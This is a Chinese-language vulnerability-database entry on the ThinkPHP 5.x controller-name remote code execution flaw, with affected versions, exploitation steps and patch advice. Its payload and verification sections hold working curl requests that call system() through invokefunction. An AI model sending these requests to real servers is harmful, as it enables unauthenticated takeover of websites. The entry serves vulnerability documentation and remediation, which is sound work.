---
id: THINKPHP-5-RCE
title: ThinkPHP5 5.0.22/5.1.29 远程代码执行漏洞
product: thinkphp
vendor: ThinkPHP
version_affected: "5.0.0 - 5.0.22, 5.1.0 - 5.1.29"
severity: CRITICAL
tags: [rce, 无需认证]
fingerprint: ["ThinkPHP", "ThinkPHP 5.x"]
---

## 漏洞描述

ThinkPHP 是一款运用极广的 PHP 开发框架。其版本 5 中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

## 影响版本

- ThinkPHP 5.0.0 - 5.0.22
- ThinkPHP 5.1.0 - 5.1.29

## 前置条件

- 无需认证
- 目标没有开启强制路由

## 利用步骤

1. 利用 `\\think\\app/invokefunction` 调用任意函数
2. 使用 `call_user_func_array` 执行命令

## Payload

```bash
# 执行 phpinfo
curl "http://target:8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"

# 执行任意命令
curl "http://target:8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id"
```

## 验证方法

```bash
curl -s "http://target:8080/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" | grep uid
```

## 修复建议

1. 升级 ThinkPHP 至 5.0.23+ 或 5.1.30+
2. 开启强制路由
3. 升级到最新版本的 ThinkPHP
